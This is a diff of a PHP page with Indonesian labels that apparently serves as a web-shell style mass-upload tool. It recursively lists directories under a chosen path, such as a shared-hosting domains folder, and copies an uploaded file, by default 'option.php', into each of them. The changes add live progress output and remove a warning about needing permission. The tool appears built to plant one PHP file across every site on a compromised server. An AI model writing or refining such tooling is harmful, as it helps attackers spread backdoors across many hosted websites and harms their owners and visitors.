@@ -21,7 +21,6 @@ function getAllDirectories($basePath, $maxDepth = 5) {
         RecursiveIteratorIterator::SELF_FIRST
     );
     
-    $currentDepth = 0;
     foreach ($iterator as $path => $dir) {
         if ($dir->isDir()) {
             $depth = $iterator->getDepth();
@@ -38,7 +37,7 @@ function getAllDirectories($basePath, $maxDepth = 5) {
     return $directories;
 }
 
-// Fungsi untuk upload file ke multiple direktori
+// Fungsi untuk upload file ke multiple direktori dengan output real-time
 function massUpload($sourceFile, $targetDirectories, $fileName) {
     $results = [];
     $uploadCount = 0;
@@ -54,55 +53,48 @@ function massUpload($sourceFile, $targetDirectories, $fileName) {
         }
         
         if (copy($sourceFile, $targetPath)) {
-            $results[] = [
+            $result = [
                 'status' => 'success',
                 'path' => $targetPath,
-                'url' => getUrlFromPath($targetPath)
+                'location' => $targetPath // Gunakan path langsung sebagai lokasi
             ];
+            $results[] = $result;
             $uploadCount++;
+            
+            // Output real-time
+            echo '<div class="url-item success">';
+            echo '✅ <strong>SUKSES:</strong> ';
+            echo '<span style="color: #00ff00;">' . $targetPath . '</span>';
+            echo '</div>';
+            flush();
+            ob_flush();
         } else {
-            $results[] = [
+            $result = [
                 'status' => 'error',
                 'path' => $targetPath,
                 'error' => 'Gagal mengupload file'
             ];
+            $results[] = $result;
+            
+            // Output real-time
+            echo '<div class="url-item error">';
+            echo '❌ <strong>GAGAL:</strong> ';
+            echo $result['path'] . ' - ';
+            echo '<span style="color: #ff6666;">' . $result['error'] . '</span>';
+            echo '</div>';
+            flush();
+            ob_flush();
         }
+        
+        // Delay kecil untuk efek visual
+        usleep(100000); // 0.1 detik
     }
     
     return [
         'total' => count($targetDirectories),
         'success' => $uploadCount,
-        'failed' => count($targetDirectories) - $uploadCount,
-        'details' => $results
+        'failed' => count($targetDirectories) - $uploadCount
     ];
-}
-
-// Fungsi untuk mengubah path menjadi URL
-function getUrlFromPath($path) {
-    // Cari public_html dalam path
-    if (strpos($path, 'public_html') !== false) {
-        $parts = explode('public_html', $path);
-        if (count($parts) > 1) {
-            $webPath = ltrim($parts[1], '/');
-            
-            // Dapatkan domain dari path
-            $domainParts = explode('/', $parts[0]);
-            $domain = end($domainParts);
-            
-            $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
-            return $protocol . "://" . $domain . "/" . $webPath;
-        }
-    }
-    
-    // Fallback untuk path biasa
-    $basePath = getCurrentDirectory();
-    $webPath = str_replace($basePath, '', $path);
-    $webPath = ltrim($webPath, '/');
-    
-    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
-    $host = $_SERVER['HTTP_HOST'];
-    
-    return $protocol . "://" . $host . "/" . $webPath;
 }
 
 // Proses form submission
@@ -138,7 +130,23 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
     // Upload file
     if (!empty($filteredDirs) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
         $tempFile = $_FILES['upload_file']['tmp_name'];
+        
+        // Mulai output real-time
+        echo '<div class="output">';
+        echo '<h3>📊 Proses Upload Massal:</h3>';
+        echo '<div class="stats">';
+        echo '<div class="stat-box">';
+        echo '<div>Total Direktori</div>';
+        echo '<div style="font-size: 1.5rem;">' . count($filteredDirs) . '</div>';
+        echo '</div>';
+        echo '</div>';
+        echo '<h4>📝 Lokasi File yang Diupload:</h4>';
+        echo '<div class="url-list">';
+        
         $uploadResult = massUpload($tempFile, $filteredDirs, $fileName);
+        
+        echo '</div>';
+        echo '</div>';
     }
 }
 
@@ -247,7 +255,7 @@ $currentDir = getCurrentDirectory();
             padding: 20px;
             border-radius: 5px;
             margin-top: 20px;
-            max-height: 500px;
+            max-height: 600px;
             overflow-y: auto;
         }
         
@@ -264,10 +272,14 @@ $currentDir = getCurrentDirectory();
         }
         
         .url-item {
-            padding: 8px;
+            padding: 10px;
             border-bottom: 1px solid rgba(0, 255, 0, 0.2);
             word-break: break-all;
             font-size: 0.9rem;
+            animation: fadeIn 0.5s ease-in;
+            background: rgba(0, 255, 0, 0.05);
+            margin-bottom: 5px;
+            border-radius: 3px;
         }
         
         @keyframes glow {
@@ -276,6 +288,17 @@ $currentDir = getCurrentDirectory();
             }
             to {
                 text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00;
+            }
+        }
+        
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
             }
         }
         
@@ -294,28 +317,22 @@ $currentDir = getCurrentDirectory();
             background: rgba(0, 255, 0, 0.1);
         }
         
-        .example {
+        .simple-info {
             color: #ffff00;
             font-size: 0.8rem;
+            margin-top: 3px;
+            opacity: 0.7;
+        }
+        
+        .path-display {
+            font-family: 'Courier New', monospace;
+            color: #00ff00;
+            background: rgba(0, 255, 0, 0.1);
+            padding: 8px;
+            border-radius: 3px;
+            border: 1px solid rgba(0, 255, 0, 0.3);
             margin-top: 5px;
-            opacity: 0.8;
-        }
-        
-        .current-path {
-            background: rgba(255, 255, 0, 0.1);
-            padding: 10px;
-            border-radius: 5px;
-            margin: 10px 0;
-            border-left: 4px solid #ffff00;
-        }
-        
-        .warning {
-            color: #ff0000;
-            background: rgba(255, 0, 0, 0.1);
-            padding: 10px;
-            border-radius: 5px;
-            margin: 10px 0;
-            border-left: 4px solid #ff0000;
+            word-break: break-all;
         }
     </style>
 </head>
@@ -326,63 +343,45 @@ $currentDir = getCurrentDirectory();
         </div>
         
         <div class="info-box">
-            <strong>$ pwd:</strong> <?php echo $currentDir; ?>
+            <strong>$ pwd:</strong> 
+            <div class="path-display"><?php echo $currentDir; ?></div>
         </div>
         
         <div class="upload-form">
             <form method="POST" enctype="multipart/form-data">
                 <div class="form-group">
-                    <label>📁 Path Direktori Awal (Manual Input):</label>
+                    <label>📁 Path Direktori Awal:</label>
                     <input type="text" name="manual_path" value="<?php echo $currentDir; ?>" 
                            placeholder="Masukkan path lengkap direktori awal..." required>
-                    <div class="example">
-                        Contoh: /home/u332834506/domains/ atau <?php echo $currentDir; ?>
-                    </div>
+                    <div class="simple-info">Contoh: /home/u332834506/domains/</div>
                 </div>
                 
                 <div class="form-group">
-                    <label>📄 Pilih File untuk Upload Massal:</label>
+                    <label>📄 File untuk Upload Massal:</label>
                     <input type="file" name="upload_file" required>
                 </div>
                 
                 <div class="form-group">
                     <label>📝 Nama File Target:</label>
                     <input type="text" name="file_name" value="option.php" required>
-                    <div class="example">
-                        File akan diupload dengan nama ini ke semua direktori
-                    </div>
+                    <div class="simple-info">Nama file di setiap direktori</div>
                 </div>
                 
                 <div class="form-group">
-                    <label>📊 Kedalaman Pencarian (1-5):</label>
+                    <label>📊 Kedalaman:</label>
                     <input type="number" name="depth" min="1" max="5" value="1" required>
-                    <div class="example">
-                        1 = direktori langsung, 2 = subdirektori, 3 = sub-subdirektori, dst.
-                    </div>
+                    <div class="simple-info">Level subdirektori (1-5)</div>
                 </div>
                 
                 <button type="submit">🚀 START MASS UPLOAD!</button>
             </form>
         </div>
         
-        <div class="info-box">
-            <h3>📋 Informasi Konfigurasi:</h3>
-            <div class="current-path">
-                <strong>Path yang akan diproses:</strong> <?php echo $selectedPath; ?>
-            </div>
-            <div class="warning">
-                ⚠️ <strong>PERINGATAN:</strong> Tools ini akan mengupload file ke SEMUA direktori dalam path yang ditentukan. 
-                Pastikan Anda memiliki izin dan tahu konsekuensinya!
-            </div>
-        </div>
-        
         <?php if ($uploadResult): ?>
-            <div class="output">
-                <h3>📊 Hasil Upload Massal:</h3>
-                
+            <div class="info-box">
                 <div class="stats">
                     <div class="stat-box">
-                        <div>Total Direktori</div>
+                        <div>Total</div>
                         <div style="font-size: 1.5rem;"><?php echo $uploadResult['total']; ?></div>
                     </div>
                     <div class="stat-box success">
@@ -394,37 +393,8 @@ $currentDir = getCurrentDirectory();
                         <div style="font-size: 1.5rem;"><?php echo $uploadResult['failed']; ?></div>
                     </div>
                 </div>
-                
-                <h4>📝 Detail Upload:</h4>
-                <div class="url-list">
-                    <?php foreach ($uploadResult['details'] as $result): ?>
-                        <div class="url-item <?php echo $result['status']; ?>">
-                            <?php if ($result['status'] === 'success'): ?>
-                                ✅ <strong>SUKSES:</strong> 
-                                <a href="<?php echo $result['url']; ?>" target="_blank" style="color: #00ff00;">
-                                    <?php echo $result['url']; ?>
-                                </a>
-                            <?php else: ?>
-                                ❌ <strong>GAGAL:</strong> 
-                                <?php echo $result['path']; ?> - 
-                                <span style="color: #ff6666;"><?php echo $result['error']; ?></span>
-                            <?php endif; ?>
-                        </div>
-                    <?php endforeach; ?>
-                </div>
             </div>
         <?php endif; ?>
-        
-        <?php
-        // Debug info
-        if (isset($targetDirs) && !empty($targetDirs)) {
-            echo '<div class="info-box">';
-            echo '<h3>🐛 Debug Info:</h3>';
-            echo '<div>Total direktori ditemukan: ' . count($targetDirs) . '</div>';
-            echo '<div>Direktori yang akan diupload: ' . count($filteredDirs ?? []) . '</div>';
-            echo '</div>';
-        }
-        ?>
     </div>
 
     <script>
@@ -437,10 +407,20 @@ $currentDir = getCurrentDirectory();
             const depth = document.querySelector('input[name="depth"]').value;
             const fileName = document.querySelector('input[name="file_name"]').value;
             
-            if (!confirm(`🚀 MULAI MASS UPLOAD?\n\nPath: ${path}\nKedalaman: ${depth}\nFile: ${fileName}\n\nFile akan diupload ke SEMUA direktori dalam path tersebut!`)) {
+            if (!confirm(`🚀 MULAI MASS UPLOAD?\n\nPath: ${path}\nKedalaman: ${depth}\nFile: ${fileName}`)) {
                 e.preventDefault();
             }
         });
+        
+        // Auto-scroll ke output saat upload
+        <?php if ($uploadResult): ?>
+            setTimeout(() => {
+                const output = document.querySelector('.output');
+                if (output) {
+                    output.scrollIntoView({ behavior: 'smooth' });
+                }
+            }, 100);
+        <?php endif; ?>
     </script>
 </body>
 </html>
